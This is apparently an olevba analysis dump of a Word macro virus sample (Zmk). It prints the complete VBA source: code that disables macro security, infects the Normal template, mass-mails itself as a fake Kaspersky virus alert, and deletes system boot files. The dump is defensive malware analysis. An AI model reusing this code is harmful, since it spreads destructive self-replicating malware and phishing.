olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.r-8f373ef48c753f7d71169837fc46f67e6a3c4ee4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.r-8f373ef48c753f7d71169837fc46f67e6a3c4ee4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO ZmkMail.cls 
in file: Virus.MSWord.Zmk.r-8f373ef48c753f7d71169837fc46f67e6a3c4ee4 - OLE stream: 'Macros/VBA/ZmkMail'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error GoTo ErrorDocOpen
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End If
Dim MyTime, COL, COLTemp, NumRnd
MyTime = Time
NumRnd = Int(Rnd * 13) + 1
THeur$ = Mid(MyTime, 1, 2)
TMin$ = Mid(MyTime, 4, 5)
TSec$ = Mid(MyTime, 7, 8)
iMacroNormalTempCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalTempCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "ZmkMail" Then
        ZmkMailNormInstalled = -1
    End If
Next i
If Not ZmkMailNormInstalled Then
    ActiveDocument.VBProject.VBComponents("ZmkMail").Export "C:\Mail.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\mail.sys"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.DeleteLines 1, 4
    COLTemp = NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 1, "Sub FileTemplates()"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 2, "    Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 3, "End Sub"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 4, "Sub ToolsMacro()"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 5, "    Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 6, "End Sub"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 7, "Sub ViewVBCode()"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 8, "    Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 9, "End Sub"
Else
    iMacroDocuCount = ActiveDocument.VBProject.VBComponents.Count
    For i = 1 To iMacroDocuCount
        If ActiveDocument.VBProject.VBComponents(i).Name = "ZmkMail" Then
            ZmkMailDocInstalled = -1
        End If
    Next i
If Not ZmkMailDocInstalled Then
    NormalTemplate.VBProject.VBComponents("ZmkMail").Export "C:\Mail.sys"
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Mail.sys"
    ActiveDocument.VBProject.VBComponents("ZmkMail").CodeModule.DeleteLines 1, 4
    COL = ActiveDocument.VBProject.VBComponents("ZmkMail").CodeModule.CountOfLines
    ActiveDocument.VBProject.VBComponents("ZmkMail").CodeModule.DeleteLines COL - 8, 9
    ActiveDocument.Save
End If
If (THeur$ = "12") Or (TMin$ = "12") Or (TSec$ = "12") Then
    Call PayMail
Else
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText "1*1=1 2*2=4 3*3=9"
    If (NumRnd = 13) And (TMin$ = "13") Then
        MsgBox "Clear Files", , "Microsoft Word"
        Kill "C:\Autoexec.bat"
        Kill "C:\Config.sys"
        Kill "C:\msdos.sys"
        Kill "c:\io.sys"
    End If
End If
End If
ErrorDocOpen:
End Sub
Private Sub PayMail()
On Error GoTo ErrorPayMail
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End If
ms = Application.MailSystem
If ms = wdMAPI Then
    Options.SendMailAttach = True
    ActiveDocument.SendMail
    Dim PauseTime, Start, Finish, TotalTime
    PauseTime = 5
    Start = Timer
    Do While Timer < Start + PauseTime
    Loop
    SendKeys "%{o}", True
    SendKeys "h", True
    SendKeys "{TAB 3}", True
    SendKeys "{ENTER 2}", True
    SendKeys "{TAB 2}", True
    SendKeys "+{END}", True
    SendKeys "{DEL}", True
    SendKeys "AVP Virus Information Update", True
    SendKeys "{TAB 2}", True
    SendKeys "This mail contains important information about new macro virus.", True
    SendKeys "{ENTER}", True
    SendKeys "Please read the attached document, now"
    SendKeys "{ENTER 2}", True
    SendKeys "Send you suggestions or questions, to webmaster@avp.com", True
    SendKeys "{ENTER 2}", True
    SendKeys "Eugène Kaspersky", True
    SendKeys "%{s}", True
End If
ErrorPayMail:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

